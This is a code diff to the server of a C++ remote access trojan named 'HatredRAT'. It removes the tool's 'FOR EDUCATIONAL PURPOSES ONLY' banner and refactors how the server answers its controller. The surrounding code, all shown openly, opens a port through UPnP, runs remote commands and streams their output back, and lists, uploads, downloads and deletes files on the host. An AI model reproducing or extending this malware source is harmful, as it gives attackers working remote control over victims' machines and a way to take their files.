@@ -81,9 +81,6 @@ void xml_print(xml::xml_node& node, int depth) {
 }
 
 int main(int argc, const char** argv) {
-    DPRINTF("HatredRAT version 1.\n"
-            "FOR EDUCATIONAL PURPOSES ONLY.\n");
-
     DPRINTF("attempting to start server\n");
 
     DPRINTF("try upnp\n");
@@ -107,9 +104,9 @@ int main(int argc, const char** argv) {
     ssdp::ssdp_message message = ssdp::ssdp_message();
     while (ssdp::recv_message(message, upnpsock, 100) >= 0) {
         if (message.header.contains("ST") && message.header["ST"] == "urn:schemas-upnp-org:device:InternetGatewayDevice:1") {
-            for (const auto& [k, v] : message.header) {
-                //DPRINTF("GOT FIELD \"%s:%s\"\n", k.c_str(), v.c_str());
-            }
+            // for (const auto& [k, v] : message.header) {
+            //  DPRINTF("GOT FIELD \"%s:%s\"\n", k.c_str(), v.c_str());
+            // }
 
             if (message.header.contains("LOCATION")) {
                 std::string loc = message.header["LOCATION"];
@@ -433,21 +430,15 @@ int main(int argc, const char** argv) {
                 proto::hatred_hdr msg;
                 while (client != -1 && proto::hatred_hdr::recv(client, msg) >= 0) {
                     DPRINTF("=== recv %i\n", msg.op);
-
-                    if (proto::hatred_op(msg.op) == proto::hatred_op::ECHO) {
+                    
+                    if (msg.op == proto::hatred_op::ECHO) {
                         proto::hatred_echo body;
                         proto::hatred_echo::recv(client, body);
-
-                        proto::hatred_hdr{
-                            .op = (int)proto::hatred_op::ECHO
-                        }.send(client);
                         
-                        proto::hatred_echo{
-                            .message = body.message
-                        }.send(client);
+                        proto::hatred_echo::sendp(client, body.message);
 
                         DPRINTF("%s\n", body.message.c_str());
-                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::EXEC) {                        
+                    } else if (msg.op == proto::hatred_op::EXEC) {                        
                         proto::hatred_exec body;
                         proto::hatred_exec::recv(client, body);
 
@@ -466,10 +457,7 @@ int main(int argc, const char** argv) {
                             if (cpid == -1) {
                                 DPERROR("fork()");
                                 
-                                proto::hatred_hdr{
-                                    .length = 0,
-                                    .op = (int)proto::hatred_op::CLOSE
-                                }.send(client);
+                                proto::hatred_hdr::sendp(client, proto::hatred_op::CLOSE);
 
                                 close(stdinp[0]);
                                 close(stdinp[1]);
@@ -552,9 +540,8 @@ int main(int argc, const char** argv) {
                             sigemptyset(&act.sa_mask);
                             sigaddset(&act.sa_mask, SIGCHLD);
                             act.sa_handler = fnutil::decay<void(int), 0xbd552>([&](int a){
+                                // was pretty dumb a while ago. this used to just instantly close the connection so both the server and client would sometimes get stuck forever. now it flushes the output and gracefully exits.
                                 if (cpid != -1) waitpid(cpid, 0, WUNTRACED);
-                                close(client);
-                                client = -1;
                                 cpid = -1;
                                 sigaction(SIGCHLD, &oact, NULL);
                             });
@@ -562,7 +549,7 @@ int main(int argc, const char** argv) {
                             sigaction(SIGCHLD, &act, &oact);
 
                             while (poll(streams, 4, 1000) != -1) {
-                                if ((streams[0].revents | streams[1].revents | streams[2].revents | streams[3].revents) & (POLLHUP | POLLERR | POLLRDHUP)) {
+                                if ((streams[0].revents | streams[1].revents | streams[2].revents | streams[3].revents) & (POLLHUP | POLLERR | POLLRDHUP) || (!((streams[0].revents | streams[1].revents) & POLLIN) && cpid == -1)) {
                                     break;
                                 }
 
@@ -572,31 +559,16 @@ int main(int argc, const char** argv) {
                                     
                                     DPRINTF("STDOUT ===\n%s\n===", buf);
 
-                                    proto::hatred_hdr{
-                                        .length = 0,
-                                        .op = (int)proto::hatred_op::STREAM
-                                    }.send(client);
-
-                                    proto::hatred_stream{
-                                        .fno = 1,
-                                        .data = std::string(buf)
-                                    }.send(client);
+                                    proto::hatred_stream::sendp(client, 1, std::string(buf, read));
                                 }
 
                                 if (streams[2].revents & POLLIN) {
                                     char buf[128] = {};
                                     int read = ::read(stderrp[0], buf, 128);
+
                                     DPRINTF("STDERR ===\n%s\n===", buf);
 
-                                    proto::hatred_hdr{
-                                        .length = 0,
-                                        .op = (int)proto::hatred_op::STREAM
-                                    }.send(client);
-
-                                    proto::hatred_stream{
-                                        .fno = 1,
-                                        .data = std::string(buf)
-                                    }.send(client);
+                                    proto::hatred_stream::sendp(client, 2, std::string(buf, read));
                                 }
 
                                 if (streams[3].revents & POLLIN) {
@@ -651,7 +623,7 @@ int main(int argc, const char** argv) {
 
                                         proto::hatred_hdr{
                                             .length = 0,
-                                            .op = (int)proto::hatred_op::STREAM
+                                            .op = proto::hatred_op::STREAM
                                         }.send(client);
 
                                         proto::hatred_stream{
@@ -665,7 +637,7 @@ int main(int argc, const char** argv) {
 
                                         proto::hatred_hdr{
                                             .length = 0,
-                                            .op = (int)proto::hatred_op::STREAM
+                                            .op = proto::hatred_op::STREAM
                                         }.send(client);
 
                                         proto::hatred_stream{
@@ -695,6 +667,8 @@ int main(int argc, const char** argv) {
                             fclose(pstdin);
                             fclose(pstdout);
                             fclose(pstderr);
+
+                            proto::hatred_hdr::sendp(client, proto::hatred_op::CEXIT);
 #ifndef __WIN32
                         } else {
                             const char** argv = (const char**)malloc(sizeof(char*) * (body.args.size() + 2));
@@ -713,7 +687,7 @@ int main(int argc, const char** argv) {
                             exit(0);
                         }
 #endif
-                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::GETDIR) {
+                    } else if (msg.op == proto::hatred_op::GETDIR) {
                         proto::hatred_getdir req;
                         if (!proto::hatred_getdir::recv(client, req)) {
                             std::error_code err;
@@ -730,31 +704,29 @@ int main(int argc, const char** argv) {
                                         d.content.push_back(f);
                                     }
 
-                                    proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::DIRDT}.send(client);
+                                    proto::hatred_hdr{.length = 0, .op = proto::hatred_op::DIRDT}.send(client);
                                     d.send(client);
                                 } else proto::send_error(client, make_error_code(std::errc::not_a_directory));
                             } else proto::send_error(client, err);
                         }
                         //if (std::filesystem::exists())
-                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::GETFILE) {
+                    } else if (msg.op == proto::hatred_op::GETFILE) {
                         proto::hatred_getfile req;
                         if (!proto::hatred_getfile::recv(client, req)) {
                             FILE* file = fopen(req.name.c_str(), "r");
 
                             if (file) {
-                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ACK}.send(client);
+                                proto::hatred_hdr::sendp(client, proto::hatred_op::ACK);
 
                                 char* chunk = new char[STREAM_CHUNK_SIZE];
 
                                 while (size_t csiz = fread(chunk, 1, STREAM_CHUNK_SIZE, file)) {
-                                    proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::STREAM}.send(client);
-                                    proto::hatred_stream{.fno = 0, .data = std::string(chunk, csiz)}.send(client);
+                                    proto::hatred_stream::sendp(client, 0, std::string(chunk, csiz));
                                 }
 
                                 delete[] chunk;
 
-                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::STREAM}.send(client);
-                                proto::hatred_stream{.fno = 0, .data = ""}.send(client);
+                                proto::hatred_stream::sendp(client, 0, "");
 
                                 fclose(file);
                             } else {
@@ -762,19 +734,19 @@ int main(int argc, const char** argv) {
                                 proto::send_error(client, std::make_error_code(std::errc(errno)));
                             }
                         }
-                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::PUTFILE) {
+                    } else if (msg.op == proto::hatred_op::PUTFILE) {
                         __label__ abrt;
                         proto::hatred_putfile req;
                         if (!proto::hatred_putfile::recv(client, req)) {
                             FILE* file = fopen(req.name.c_str(), "w");
 
                             if (file) {
-                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ACK}.send(client);
+                                proto::hatred_hdr::sendp(client, proto::hatred_op::ACK);
 
                                 while (1) {
                                     proto::hatred_hdr hdr;
                                     if (!proto::hatred_hdr::recv(client, hdr)) {
-                                        if (proto::hatred_op(hdr.op) == proto::hatred_op::STREAM) {
+                                        if (hdr.op == proto::hatred_op::STREAM) {
                                             proto::hatred_stream sd;
                                             if (!proto::hatred_stream::recv(client, sd)) {
                                                 if (sd.data.size() == 0) break;
@@ -796,7 +768,7 @@ int main(int argc, const char** argv) {
                                 proto::send_error(client, std::make_error_code(std::errc(errno)));
                             }
                         } abrt:;
-                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::RMFILE) {
+                    } else if (msg.op == proto::hatred_op::RMFILE) {
                         __label__ abrt;
                         proto::hatred_rmfile req;
                         if (!proto::hatred_rmfile::recv(client, req)) {
@@ -804,8 +776,7 @@ int main(int argc, const char** argv) {
                             if (std::filesystem::exists(req.name, err) && !err) {
                                 if (std::filesystem::is_directory(req.name, err) && !err) {
                                     if (!std::filesystem::is_empty(req.name, err) && !err) {
-                                        proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ERROR}.send(client);
-                                        proto::hatred_error{.what = proto::hatred_errno::NEMPTY}.send(client);
+                                        proto::hatred_error::sendp(client, proto::hatred_errno::NEMPTY);
                                         goto abrt;
                                     } else if (err) {
                                         proto::send_error(client, err);
@@ -821,13 +792,12 @@ int main(int argc, const char** argv) {
                                     goto abrt;
                                 }
 
-                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ACK}.send(client);
+                                proto::hatred_hdr::sendp(client, proto::hatred_op::ACK);
                             } else if (err) {
                                 proto::send_error(client, err); 
                                 goto abrt;
                             } else {
-                                proto::hatred_hdr{.length = 0, .op = (int)proto::hatred_op::ERROR}.send(client); 
-                                proto::hatred_error{.what = proto::hatred_errno::NEXIST}.send(client);
+                                proto::hatred_error::sendp(client, proto::hatred_errno::NEXIST);
                                 goto abrt;
                             }
                         } abrt:;
